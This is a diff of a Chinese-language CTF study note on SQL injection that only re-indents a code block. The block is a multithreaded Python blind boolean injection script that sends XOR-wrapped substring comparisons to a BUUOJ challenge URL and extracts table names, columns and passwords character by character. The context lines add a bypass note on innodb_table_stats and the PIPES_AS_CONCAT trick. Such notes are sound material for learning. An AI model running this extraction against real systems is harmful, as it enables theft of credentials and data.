@@ -216,66 +216,66 @@ select group_concat(table_name) from mysql.innodb_table_stats
 
   * 利用0^1^0 并采取多线程
 
-    ```python
-    #coding=utf-8
-    import requests
-    import threading
-    url="http://d23fcdc7-5653-43bc-802e-afeb7d6efea4.node3.buuoj.cn/search.php?id="
+```python
+#coding=utf-8
+import requests
+import threading
+url="http://d23fcdc7-5653-43bc-802e-afeb7d6efea4.node3.buuoj.cn/search.php?id="
 
-    #sql="select(group_concat(username))from(admin)" 
-    #sql="select(group_concat(password))from(admin)"
-    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')"
-    #sql="select(group_concat(content))from(contents)"
-    #sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
-    #Result:F1naI1y,Flaaaaag
-    sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"
-    #Result:id,username,password
-    sql="select(group_concat(password))from(F1naI1y)"
-    #sql="select(group_concat(password))from(users)"
-    ret=''
-    def booltest(start,end):
-        ret=""
-        for i in range(start,end):
-            l=1
-            r=255
-            while(l+1<r):
-                mid=(l+r)/2
-                payload="0^((ascii(substr(({0}),{1},1)))>{2})^0".format(sql,i,mid)
-                #payload="union select * from images where id=if(1>0,1,0)#"
-                #print payload
-                param = {
-                    "id":payload,
-                }
-                #print chr(mid)
-                req=requests.get(url,params=param)
-                if (req.status_code != requests.codes.ok):
-                    continue
-                #print req.text
-                if (len(req.text)>720):
-                    l=mid
-                else :
-                    r=mid
-            ret=ret+chr(r)
-            print(threading.current_thread().name+"working:"+ret) 
-        print(threading.current_thread().name+ret)
+#sql="select(group_concat(username))from(admin)" 
+#sql="select(group_concat(password))from(admin)"
+#sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')"
+#sql="select(group_concat(content))from(contents)"
+#sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
+#Result:F1naI1y,Flaaaaag
+sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"
+#Result:id,username,password
+sql="select(group_concat(password))from(F1naI1y)"
+#sql="select(group_concat(password))from(users)"
+ret=''
+def booltest(start,end):
+    ret=""
+    for i in range(start,end):
+        l=1
+        r=255
+        while(l+1<r):
+            mid=(l+r)/2
+            payload="0^((ascii(substr(({0}),{1},1)))>{2})^0".format(sql,i,mid)
+            #payload="union select * from images where id=if(1>0,1,0)#"
+            #print payload
+            param = {
+                "id":payload,
+            }
+            #print chr(mid)
+            req=requests.get(url,params=param)
+            if (req.status_code != requests.codes.ok):
+                continue
+            #print req.text
+            if (len(req.text)>720):
+                l=mid
+            else :
+                r=mid
+        ret=ret+chr(r)
+        print(threading.current_thread().name+"working:"+ret) 
+    print(threading.current_thread().name+ret)
 
 
-    thr1 = threading.Thread(target=booltest, args=(1, 4),name="1")
-    thr2 = threading.Thread(target=booltest, args=(4, 8),name="2")
-    thr3 = threading.Thread(target=booltest, args=(8, 12),name="3")
-    thr4 = threading.Thread(target=booltest, args=(12, 16),name="4")
-    thr5 = threading.Thread(target=booltest, args=(16, 20), name="5")
-    thr6 = threading.Thread(target=booltest, args=(20, 24), name="6")
-    thr7 = threading.Thread(target=booltest, args=(24, 28), name="7")
+thr1 = threading.Thread(target=booltest, args=(1, 4),name="1")
+thr2 = threading.Thread(target=booltest, args=(4, 8),name="2")
+thr3 = threading.Thread(target=booltest, args=(8, 12),name="3")
+thr4 = threading.Thread(target=booltest, args=(12, 16),name="4")
+thr5 = threading.Thread(target=booltest, args=(16, 20), name="5")
+thr6 = threading.Thread(target=booltest, args=(20, 24), name="6")
+thr7 = threading.Thread(target=booltest, args=(24, 28), name="7")
 
-    thr1.start()
-    thr2.start()
-    thr3.start()
-    thr4.start()
-    thr5.start()
-    thr6.start()
-    thr7.start()
-    ```
+thr1.start()
+thr2.start()
+thr3.start()
+thr4.start()
+thr5.start()
+thr6.start()
+thr7.start()
+```
   * 修改 ``||``(或)运算符为字符串连接符
     ``set sql_mode=PIPES_AS_CONCAT;`` 
 ## 参考资料
